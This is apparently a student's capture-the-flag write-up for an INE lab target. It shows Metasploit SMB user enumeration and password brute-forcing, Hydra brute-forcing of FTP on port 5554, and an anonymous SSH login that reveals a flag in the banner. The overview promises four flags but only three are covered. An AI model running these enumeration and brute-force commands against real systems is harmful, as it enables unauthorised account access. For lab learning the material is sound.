\chapter{CTF 3 --- SMB, FTP, SSH Multi-Flag}
\label{ctf:ctf3}

\begin{notebox}[Target overview]
Multi-service CTF with four flags spread across SMB, FTP, and SSH. Each flag
leaves a hint pointing toward the next service. The chain requires reading flag
content carefully before moving on.
\end{notebox}

\section*{Tools Used}
\begin{itemize}
  \item \tool{nmap} --- port discovery and service identification
  \item \tool{Metasploit} --- SMB user enumeration and login brute-force
  \item \tool{smbclient} --- share access and file retrieval
  \item \tool{Hydra} --- FTP credential brute-force
  \item \tool{ssh} --- SSH anonymous login attempt
\end{itemize}

\section*{Flag 1 --- SMB Share Access}

\begin{termbox}
# Step 1: Confirm SMB is open
nmap -sV -p 445 target.ine.local

# Step 2: Enumerate valid SMB users
msfconsole -q
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS target.ine.local
run

# Step 3: Brute-force credentials
use auxiliary/scanner/smb/smb_login
set RHOSTS target.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
\end{termbox}

Found valid credentials. Connected to the SMB share using \tool{smbclient} with
the SMBv2/v3 protocol flags required by this target:

\begin{termbox}
smbclient --option='client min protocol=SMB2' \
          --option='client max protocol=SMB3' \
          //target.ine.local/share_name -U found_user
# Inside smbclient:
ls
get flag.txt
exit
cat flag.txt
\end{termbox}

\screenshot{assets/images/Screenshot_2025-12-15_at_6.36.50_AM.png}{smbclient retrieving flag from SMB share using SMBv2/3 options}

\begin{takebox}
\textbf{Lesson:} When \ic{smbclient} fails silently or hangs, always try the
\ic{--option='client min protocol=SMB2'} flag. Some targets explicitly reject
SMBv1 connections. The flag content contained a hint about FTP and specific
usernames --- read it fully before moving on.
\end{takebox}

\section*{Flag 2 --- FTP with Custom User List}

Flag 1 contained a hint naming specific usernames. I created a targeted user list
from those names and used Hydra to brute-force FTP running on a non-standard port.

\begin{termbox}
# Build user list from names in flag hint
echo "user1" > /root/user.txt
echo "user2" >> /root/user.txt

# Brute-force FTP on non-standard port 5554
hydra -L /root/user.txt \
      -P /root/Desktop/wordlists/unix_passwords.txt \
      ftp://target.ine.local -s 5554

# Login with found credentials
ftp target.ine.local 5554
ls
get flag2.txt
exit
cat flag2.txt
\end{termbox}

\screenshot{assets/images/Screenshot_2025-12-15_at_8.13.57_AM.png}{Hydra brute-forcing FTP on port 5554 and finding valid credentials}

\begin{takebox}
\textbf{Lesson:} Non-standard ports matter. The initial nmap scan showed an unusual
port that turned out to be FTP. Always scan all ports or at least the top 5000
(\ic{nmap -p 1-5000}) rather than only the top 1000. Flag 2 contained a hint
about SSH.
\end{takebox}

\section*{Flag 3 --- SSH Anonymous Login Banner}

Brute-forcing SSH directly failed --- too many attempts or the account locked. I
tried anonymous login instead.

\begin{termbox}
# Try anonymous SSH login
ssh anonymous@target.ine.local

# Flag appeared inside the SSH warning/banner message on login
\end{termbox}

The flag was embedded directly in the SSH banner message displayed on connection.
No password was required --- the \ic{anonymous} account connected and the banner
contained the flag.

\begin{takebox}
\textbf{Lesson:} When brute-force fails on SSH, step back and try the simple
things first. Anonymous login, guest accounts, and banner messages are often
overlooked. The SSH banner is displayed before authentication completes, so even
a rejected login can reveal information.
\end{takebox}

\section*{Flags Summary}

\begin{checkbox}
\begin{itemize}
  \item[$\checkmark$] \textbf{Flag 1} --- SMB share access with brute-forced
        credentials (SMBv2/3 protocol flags required)
  \item[$\checkmark$] \textbf{Flag 2} --- FTP brute-force using usernames
        hinted in flag 1, non-standard port 5554
  \item[$\checkmark$] \textbf{Flag 3} --- SSH anonymous login banner message
\end{itemize}
\end{checkbox}
